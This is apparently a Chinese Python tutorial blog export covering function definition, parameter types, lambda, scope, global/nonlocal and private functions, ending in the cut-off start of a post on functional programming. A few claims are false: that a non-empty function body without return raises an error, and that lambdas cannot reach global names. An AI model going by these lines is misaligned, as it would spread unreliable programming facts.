<li>自定义函数又分为普通（有名字的）函数和匿名（无名字的）函数，二者定义方式不一样；</li>
<li>自定义和函数里面还可嵌套定义其他函数，匿名函数定义时是一条语句，并且要赋值给一个变量指针。</li>
<li>普通函数的函数体如果为空，则必须放入一条pass语句，否则会报错；函数体不为空的必须有return语句，否则会报错。</li>
</ol>
<br>

<br>

<h3 id="一-定义函数"><a href="#一-定义函数" class="headerlink" title="一. 定义函数"></a><font color="#FF6347" face="Comic sans MS">一. 定义函数</font></h3><blockquote>
<p><strong>自定义函数简单的规则：</strong></p>
</blockquote>
<ol>
<li>函数代码块以 <code>def</code> 关键词开头，依次写出函数名、括号、括号中的参数和冒号<code>:</code>。</li>
<li>函数的第一行语句可以选择性地使用文档字符串—用于存放函数说明。</li>
<li>函数内容以冒号起始，并且缩进写代码块结构。</li>
<li>用<code>return [表达式] </code>结束函数，选择性地返回一个值给调用方。不带表达式的return相当于返回 None。还可以返回多个值，如<code>return x,y</code></li>
</ol>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>语法</strong></font></p>
<p>Python 定义函数使用 def 关键字，默认情况下，参数值和参数名称是按函数声明中定义的顺序匹配起来的。一般格式如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> 函数名（参数列表）:</span></span><br><span class="line">    函数体</span><br></pre></td></tr></table></figure>

<br>

<p>以自定义一个求绝对值的my_abs函数为例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_abs</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x &gt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> -x</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">99</span></span><br></pre></td></tr></table></figure>


<br>

<br>

<h3 id="二-参数传递"><a href="#二-参数传递" class="headerlink" title="二. 参数传递"></a><font color="#FF6347" face="Comic sans MS">二. 参数传递</font></h3><p>在 python 中，类型属于对象，变量是没有类型的：<br><code>a=[1,2,3]</code><br><code>a=&quot;Runoob&quot;</code><br>以上代码中，[1,2,3] 是 List 类型，”Runoob” 是 String 类型，而变量 a 是没有类型，她仅仅是一个对象的引用（一个指针），可以是指向 List 类型对象，也可以是指向 String 类型对象。</p>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>一、可更改(mutable)与不可更改(immutable)对象</strong></font></p>
<p>在 python 中，<font color="#FF7F00"><strong>strings, tuples, 和 numbers 是不可更改的对象，而 list,dict 等则是可以修改的对象</strong></font>。</p>
<p>python 函数的参数传递：</p>
<ul>
<li><p><strong>不可变类型：</strong>类似 c++ 的值传递，如 <strong>整数</strong>、<strong>字符串</strong>、<strong>元组</strong>。如fun（a），传递的只是a的值，没有影响a对象本身。比如在 fun（a）内部修改 a 的值，只是修改另一个复制的对象，不会影响 a 本身。</p>
</li>
<li><p><strong>可变类型：</strong>类似 c++ 的引用传递（地址），如 <strong>列表</strong>，<strong>字典</strong>。如 fun（la），则是将 la 真正的传过去，修改后fun外部的la也会受影响</p>
</li>
</ul>
<blockquote>
<p>python 中<font color="#FF7F00"><strong>一切都是对象</strong></font>，严格意义我们不能说值传递还是引用传递，我们应该说<font color="#FF7F00"><strong>传不可变对象和传可变对象</strong></font>。</p>
</blockquote>
<br>

<p>python 传不可变对象实例:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ChangeInt</span>(<span class="params"> a </span>):</span></span><br><span class="line">    a = <span class="number">10</span></span><br><span class="line"> </span><br><span class="line">b = <span class="number">2</span></span><br><span class="line">ChangeInt(b)</span><br><span class="line"><span class="built_in">print</span>( b ) <span class="comment"># 结果是 2</span></span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p>实例中有 int 对象 2，指向它的变量是 b，在传递给 ChangeInt 函数时，按传值的方式复制了变量 b，a 和 b 都指向了同一个 Int 对象，在 a&#x3D;10 时，则新生成一个 int 值对象 10，并让 a 指向它。</p>
</blockquote>
</blockquote>
<br>

<p>传可变对象实例:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeme</span>(<span class="params"> mylist </span>):</span></span><br><span class="line">   <span class="string">&quot;修改传入的列表&quot;</span></span><br><span class="line">   mylist.append([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;函数内取值1: &quot;</span>, mylist)</span><br><span class="line">   mylist.append(<span class="number">5</span>)</span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;函数内取值2: &quot;</span>, mylist)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用changeme函数</span></span><br><span class="line">mylist = [<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>]</span><br><span class="line">changeme( mylist )</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;函数外取值: &quot;</span>, mylist)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">函数内取值<span class="number">1</span>:  [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]]</span><br><span class="line">函数内取值<span class="number">2</span>:  [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], <span class="number">5</span>]</span><br><span class="line">函数外取值:  [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], <span class="number">5</span>]</span><br></pre></td></tr></table></figure>


<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、参数</strong></font></p>
<p><strong>以下是调用函数时可使用的正式参数类型：</strong></p>
<ol>
<li><p><font color="#FF7F00"><strong>必需参数：</strong></font>调用函数时以正确的顺序传入函数。调用时的数量必须和声明时的一样。</p>
</li>
<li><p><font color="#FF7F00"><strong>关键字参数：</strong></font>允许函数调用时参数的顺序与声明时不一致，因为 Python 解释器能够用参数名匹配参数值。</p>
</li>
<li><p><font color="#FF7F00"><strong>默认参数：</strong></font>定义函数时可指定参数值，调用函数时，如果没有传递参数，则会使用默认参数。</p>
</li>
<li><p><font color="#FF7F00"><strong>不定长参数：</strong></font>能处理比当初声明时更多的参数，这些参数被包装进一个<font color="#FF7F00"><strong>元组</strong></font>或<font color="#FF7F00"><strong>字典</strong></font>，通常，这些 可变 参数是参数列表中的最后一个，因为它们将把所有的剩余输入参数传递给函数。</p>
</li>
</ol>
<br>

<p><font color="#FF7F00" face="Comic sans MS"><strong>1. 必需参数：</strong></font></p>
<p>必需参数须以正确的顺序传入函数。调用时的数量必须和声明时的一样。</p>
<p>调用printme()函数，你必须传入一个参数，不然会出现语法错误：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printme</span>(<span class="params"> <span class="built_in">str</span> </span>):</span></span><br><span class="line">   <span class="string">&quot;打印任何传入的字符串&quot;</span></span><br><span class="line">   <span class="built_in">print</span> (<span class="built_in">str</span>)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用printme函数</span></span><br><span class="line">printme()</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;test.py&quot;</span>, line <span class="number">10</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    printme()</span><br><span class="line">TypeError: printme() missing <span class="number">1</span> required positional argument: <span class="string">&#x27;str&#x27;</span></span><br></pre></td></tr></table></figure>

<br>

<p><font color="#FF7F00" face="Comic sans MS"><strong>2. 关键字参数：</strong></font></p>
<p>关键字参数和函数调用关系紧密，函数调用使用关键字参数来确定传入的参数值。</p>
<p>使用关键字参数允许函数调用时参数的顺序与声明时不一致，因为 Python 解释器能够用参数名匹配参数值。<br>以下实例中演示了函数参数的使用不需要使用指定顺序：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span>(<span class="params"> name, age </span>):</span></span><br><span class="line">   <span class="string">&quot;打印任何传入的字符串&quot;</span></span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;名字: &quot;</span>, name)</span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;年龄: &quot;</span>, age)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用printinfo函数</span></span><br><span class="line">printinfo( age=<span class="number">50</span>, name=<span class="string">&quot;runoob&quot;</span> )</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line">名字:  runoob</span><br><span class="line">年龄:  <span class="number">50</span></span><br></pre></td></tr></table></figure>

<br>

<p><font color="#FF7F00" face="Comic sans MS"><strong>3. 默认参数：</strong></font></p>
<p>调用函数时，如果没有传递参数，则会使用默认参数。以下实例中如果没有传入 age 参数，则使用默认值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span>(<span class="params"> name, age = <span class="number">35</span> </span>):</span></span><br><span class="line">   <span class="string">&quot;打印任何传入的字符串&quot;</span></span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;名字: &quot;</span>, name)</span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;年龄: &quot;</span>, age)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用printinfo函数</span></span><br><span class="line">printinfo( age=<span class="number">50</span>, name=<span class="string">&quot;runoob&quot;</span> )</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;------------------------&quot;</span>)</span><br><span class="line">printinfo( name=<span class="string">&quot;runoob&quot;</span> )</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line">名字:  runoob</span><br><span class="line">年龄:  <span class="number">50</span></span><br><span class="line">------------------------</span><br><span class="line">名字:  runoob</span><br><span class="line">年龄:  <span class="number">35</span></span><br></pre></td></tr></table></figure>

<br>

<p><font color="#FF7F00" face="Comic sans MS"><strong>4. 不定长参数：</strong></font></p>
<blockquote>
<p><strong>你可能需要一个函数能处理比当初声明时更多的参数：</strong></p>
</blockquote>
<ol>
<li>加了星号 <code>*</code> 的参数会以<font color="#FF7F00"><strong>元组(tuple)</strong></font>的形式导入，存放所有未命名的变量参数。</li>
<li>加了两个星号<code>**</code>的参数会以<font color="#FF7F00"><strong>字典(dict)</strong></font>的形式导入。</li>
<li>声明函数时，参数中星号 * 可以单独出现。</li>
<li>如果单独出现星号 * 后的参数必须用关键字传入。</li>
</ol>
<br>

<ol>
<li>加了星号<code>*</code>的参数会以元组(tuple)的形式导入，存放所有未命名的变量参数。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span>(<span class="params"> arg1, *vartuple </span>):</span></span><br><span class="line">   <span class="string">&quot;打印任何传入的参数&quot;</span></span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;输出: &quot;</span>)</span><br><span class="line">   <span class="built_in">print</span> (arg1)</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">for</span> var <span class="keyword">in</span> vartuple:</span><br><span class="line">      <span class="built_in">print</span> (<span class="string">&quot;循环输出: &quot;</span>)</span><br><span class="line">      <span class="built_in">print</span> (var)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用printinfo 函数</span></span><br><span class="line">printinfo( <span class="number">10</span> )</span><br><span class="line">printinfo( <span class="number">70</span>, <span class="number">60</span>, <span class="number">50</span> )</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">输出:</span><br><span class="line"><span class="number">10</span></span><br><span class="line">输出:</span><br><span class="line"><span class="number">70</span></span><br><span class="line">循环输出:</span><br><span class="line"><span class="number">60</span></span><br><span class="line">循环输出:</span><br><span class="line"><span class="number">50</span></span><br></pre></td></tr></table></figure>

<br>

<ol start="2">
<li>加了两个星号<code>**</code>的参数会以字典的形式导入。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span>(<span class="params"> arg1, **vardict </span>):</span></span><br><span class="line">   <span class="string">&quot;打印任何传入的参数&quot;</span></span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;输出: &quot;</span>)</span><br><span class="line">   <span class="built_in">print</span> (arg1)</span><br><span class="line">   <span class="built_in">print</span> (vardict)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用printinfo 函数</span></span><br><span class="line">printinfo(<span class="number">1</span>, a=<span class="number">2</span>,b=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line"><span class="number">1</span></span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure>

<br>

<ol start="3">
<li>声明函数时，参数中星号 * 可以单独出现，例如:</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a,b,*,c</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a+b+c</span><br></pre></td></tr></table></figure>

<br>

<ol start="4">
<li>如果单独出现星号 * 后的参数必须用关键字传入。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a,b,*,c</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a+b+c</span><br><span class="line"> </span><br><span class="line">a = f(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)   <span class="comment"># 报错</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">报错如下：</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: f() takes <span class="number">2</span> positional arguments but <span class="number">3</span> were given</span><br><span class="line"></span><br><span class="line">改正方式：</span><br><span class="line">a = f(<span class="number">1</span>,<span class="number">2</span>,c=<span class="number">3</span>) <span class="comment"># 正常</span></span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<h3 id="三-匿名函数"><a href="#三-匿名函数" class="headerlink" title="三. 匿名函数"></a><font color="#FF6347" face="Comic sans MS">三. 匿名函数</font></h3><p><font color="#00B2EE" face="Comic sans MS"><strong>python 使用 lambda 来创建匿名函数。</strong></font></p>
<blockquote>
<p><strong>所谓匿名，意即不再使用 def 语句这样标准的形式定义一个函数。</strong></p>
</blockquote>
<ol>
<li>lambda 只是一个表达式，函数体比 def 简单很多。</li>
<li>lambda的主体是一个表达式，而不是一个代码块。仅仅能在lambda表达式中封装有限的逻辑进去。</li>
<li>lambda 函数拥有自己的命名空间，且不能访问自己参数列表之外或全局命名空间里的参数。<br>虽然lambda函数看起来只能写一行，却不等同于C或C++的内联函数，后者的目的是调用小函数时不占用栈内存从而增加运行效率。</li>
</ol>
<br>

<p><strong>语法</strong><br>lambda 函数的语法只包含一个语句，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">lambda</span> [arg1 [,arg2,.....argn]]:expression</span><br></pre></td></tr></table></figure>

<br>

<p>如下实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="built_in">sum</span> = <span class="keyword">lambda</span> arg1, arg2: arg1 + arg2</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用sum函数</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;相加后的值为 : &quot;</span>, <span class="built_in">sum</span>( <span class="number">10</span>, <span class="number">20</span> ))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;相加后的值为 : &quot;</span>, <span class="built_in">sum</span>( <span class="number">20</span>, <span class="number">20</span> ))</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line">相加后的值为 :  <span class="number">30</span></span><br><span class="line">相加后的值为 :  <span class="number">40</span></span><br></pre></td></tr></table></figure>


<br>

<br>

<h3 id="四-变量作用域"><a href="#四-变量作用域" class="headerlink" title="四. 变量作用域"></a><font color="#FF6347" face="Comic sans MS">四. 变量作用域</font></h3><p>Python 中，程序的变量并不是在哪个位置都可以访问的，访问权限决定于这个变量是在哪里赋值的。</p>
<p>变量的作用域决定了在哪一部分程序可以访问哪个特定的变量名称。Python的作用域一共有4种，分别是：</p>
<ul>
<li><font color="#FF7F00"><strong>L （Local）</strong></font> 局部作用域</li>
<li><font color="#FF7F00"><strong>E （Enclosing）</strong></font> 闭包函数外的函数中(函数A中定义了函数B，A定义的变量对B来说是闭包函数外的函数)</li>
<li><font color="#FF7F00"><strong>G （Global）</strong></font> 全局作用域</li>
<li><font color="#FF7F00"><strong>B （Built-in）</strong></font> 内置作用域（内置函数所在模块的范围）</li>
</ul>
<p>以 L –&gt; E –&gt; G –&gt;B 的规则查找，即：在局部找不到，便会去局部外的局部找（例如闭包），再找不到就会去全局找，再者去内置中找。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">g_count = <span class="number">0</span>  <span class="comment"># 全局作用域</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span>():</span></span><br><span class="line">    o_count = <span class="number">1</span>  <span class="comment"># 闭包函数外的函数中</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">        i_count = <span class="number">2</span>  <span class="comment"># 局部作用域</span></span><br></pre></td></tr></table></figure>

<br>

<p>Python 中只有模块（module），类（class）以及函数（def、lambda）才会引入新的作用域，其它的代码块（如 if&#x2F;elif&#x2F;else&#x2F;、try&#x2F;except、for&#x2F;while等）是不会引入新的作用域的，也就是说这些语句内定义的变量，外部也可以访问，如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">    msg = <span class="string">&#x27;I am from Runoob&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(msg)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">I am <span class="keyword">from</span> Runoob</span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<p>实例中 msg 变量定义在 if 语句块中，但外部还是可以访问的。<br>如果将 msg 定义在函数中，则它就是局部变量，外部不能访问。</p>
</blockquote>
<br>

<br>

<h3 id="五-全局变量和局部变量"><a href="#五-全局变量和局部变量" class="headerlink" title="五. 全局变量和局部变量"></a><font color="#FF6347" face="Comic sans MS">五. 全局变量和局部变量</font></h3><p>定义在函数内部的变量拥有一个局部作用域，定义在函数外的拥有全局作用域。</p>
<p>局部变量只能在其被声明的函数内部访问，而全局变量可以在整个程序范围内访问。调用函数时，所有在函数内声明的变量名称都将被加入到作用域中。如下实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">total = <span class="number">0</span> <span class="comment"># 这是一个全局变量</span></span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params"> arg1, arg2 </span>):</span></span><br><span class="line">    <span class="comment">#返回2个参数的和.&quot;</span></span><br><span class="line">    total = arg1 + arg2 <span class="comment"># total在这里是局部变量.</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;函数内是局部变量 : &quot;</span>, total)</span><br><span class="line">    <span class="keyword">return</span> total</span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用sum函数</span></span><br><span class="line"><span class="built_in">sum</span>( <span class="number">10</span>, <span class="number">20</span> )</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;函数外是全局变量 : &quot;</span>, total)</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line">函数内是局部变量 :  <span class="number">30</span></span><br><span class="line">函数外是全局变量 :  <span class="number">0</span></span><br></pre></td></tr></table></figure>

<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>global 和 nonlocal关键字</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>global</strong></font>：内部作用域使用全局变量，并且可以修改，作用影响全局；<br><font color="#FF7F00"><strong>nonlocal</strong></font>：函数A嵌套函数B，函数B使用函数A的变量，并且可以修改，作用影响函数A的这个变量；</p>
</blockquote>
<ol>
<li>当内部作用域想修改外部作用域的变量时，就要用到global和nonlocal关键字了。</li>
</ol>
<p>以下实例修改全局变量 num：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun1</span>():</span></span><br><span class="line">    <span class="keyword">global</span> num  <span class="comment"># 需要使用 global 关键字声明</span></span><br><span class="line">    <span class="built_in">print</span>(num) </span><br><span class="line">    num = <span class="number">123</span></span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line">fun1()</span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">123</span></span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>

<br>

<ol start="2">
<li>如果要修改嵌套作用域（enclosing 作用域，外层非全局作用域）中的变量则需要 nonlocal 关键字了，如下实例：</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span>():</span></span><br><span class="line">    num = <span class="number">10</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">        <span class="keyword">nonlocal</span> num   <span class="comment"># nonlocal关键字声明</span></span><br><span class="line">        num = <span class="number">100</span></span><br><span class="line">        <span class="built_in">print</span>(num)</span><br><span class="line">    inner()</span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line">outer()</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line"><span class="number">100</span></span><br><span class="line"><span class="number">100</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<h3 id="六-非公开函数"><a href="#六-非公开函数" class="headerlink" title="六. 非公开函数"></a><font color="#FF6347" face="Comic sans MS">六. 非公开函数</font></h3><blockquote>
<p><font color="#FF7F00"><strong>外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public</strong></font>。</p>
</blockquote>
<p>类似_xxx和__xxx这样的函数或变量就是非公开的（private），不应该被直接引用，比如_abc，__abc等；</p>
<p>之所以我们说，private函数和变量“不应该”被直接引用，而不是“不能”被直接引用，是因为Python并没有一种方法可以完全限制访问private函数或变量，但是，从编程习惯上不应该引用private函数或变量。</p>
<p>private函数或变量不应该被别人引用，那它们有什么用呢？请看例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_private_1</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, %s&#x27;</span> % name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_private_2</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hi, %s&#x27;</span> % name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greeting</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name) &gt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> _private_1(name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> _private_2(name)</span><br></pre></td></tr></table></figure>

<br>


<p>我们在模块里公开greeting()函数，而把内部逻辑用private函数隐藏起来了，这样，调用greeting()函数不用关心内部的private函数细节，这也是一种非常有用的代码封装和抽象的方法，即：</p>
<p>外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-函数式编程</title>
    <url>/post/Python-FunctionalProgramming/</url>
    <content><![CDATA[<p>装饰器还没搞懂，搞懂了再来继续写吧~<br>函数既可作为返回值也可作为函数的参数…一切都是对象，一切都是指针，一切都是东西…<br>返回函数（引用）和返回函数值是不一样滴….  ◡̈⃝︎⋆︎* </p>
<span id="more"></span>

<br>

<br>


<center><font color="#00B2EE" face="Comic sans MS" size=5>函数式编程</font> </center>


<br>

<br>

<br>

<center><font face="Comic sans MS">**函数式编程的一个特点就是，允许把函数本身作为参数传入另一个函数，还允许返回一个函数！**</font> </center>


<br>

<br>

<h3 id="一-高阶函数"><a href="#一-高阶函数" class="headerlink" title="一. 高阶函数"></a><font color="#FF6347" face="Comic sans MS">一. 高阶函数</font></h3><br>

<blockquote>
<ol>
<li><font color="#FF7F00"><strong>变量可以指向函数</strong></font>；</li>
<li><font color="#FF7F00"><strong>函数名也是变量</strong></font>；</li>
<li><font color="#FF7F00"><strong>函数可以作为return的返回值</strong></font>；</li>
<li><font color="#FF7F00"><strong>函数可以作为另一个函数的参数</strong></font>。</li>
</ol>
</blockquote>
<br>

<h4 id="1-1-变量指向函数"><a href="#1-1-变量指向函数" class="headerlink" title="1.1 变量指向函数"></a><font color="#3CB371" face="Comic sans MS">1.1 变量指向函数</font></h4><br>

<p>&amp;emsp;&amp;emsp; <font face="Microsoft YaHei">在讲变量和字符串的时候我们讲过，变量就是一个对象，可以当作一个指针使用，而函数名也是一个变量，也就是一个对象。函数名其实就是指向函数的变量！注意，函数名是一个变量！变量！变量！当作指针用。</font></p>
<p>&amp;emsp;&amp;emsp; <font face="Sans-serif">既然变量可以指向函数，函数的参数能接收变量，那么一个函数就可以接收另一个函数作为参数，这种函数就称之为<strong>高阶函数</strong>。<br></font></p>
<br>

<hr>
<hr>
<p><font color="red" face="Comic sans MS"><strong>见过两种函数赋值给变量的形式</strong></font><font face="Comic sans MS">，这两种形式是有区别的，分别总结一下。</font><br>一种是</p>
<p><strong><code>    a = f</code></strong></p>
<p>另一种是</p>
<p><strong><code>    a = f()</code></strong></p>
<p><font color="red"><strong>1.</strong> <strong><code>a = f</code></strong> <strong>型属于将变量指向函数。</strong></font></p>
<p>如下用示例说明：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">abs</span>(-<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">abs</span>)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="number">10</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">abs</span>&gt;</span><br><span class="line">------------------------------------------------------------------------------------------  </span><br><span class="line">可见，<span class="built_in">abs</span>(-<span class="number">10</span>)是函数调用，而<span class="built_in">abs</span>是函数本身。</span><br><span class="line">要获得函数调用结果，我们可以把结果赋值给变量：  </span><br><span class="line"></span><br><span class="line">x = <span class="built_in">abs</span>(-<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="number">10</span></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">但是，如果把函数本身赋值给变量呢？</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">abs</span></span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">abs</span>&gt;</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">结论：函数本身也可以赋值给变量，即：变量可以指向函数。</span><br><span class="line">如果一个变量指向了一个函数，那么，可否通过该变量来调用这个函数？用代码验证一下：</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">abs</span></span><br><span class="line"><span class="built_in">print</span>(f(-<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="number">10</span></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">成功！说明变量f现在已经指向了<span class="built_in">abs</span>函数本身。直接调用<span class="built_in">abs</span>()函数和调用变量f()完全相同。</span><br></pre></td></tr></table></figure>

<br>

<p>说明变量f现在已经指向了abs函数本身。直接调用<code>abs()</code>函数和调用变量<code>f()</code>完全相同。这是廖雪峰老师python教程上的例子，现在调用<code>f()</code>和调用<code>abs()</code>是一样的了。</p>
<br>

<p>再举一个工厂函数的例子：</p>
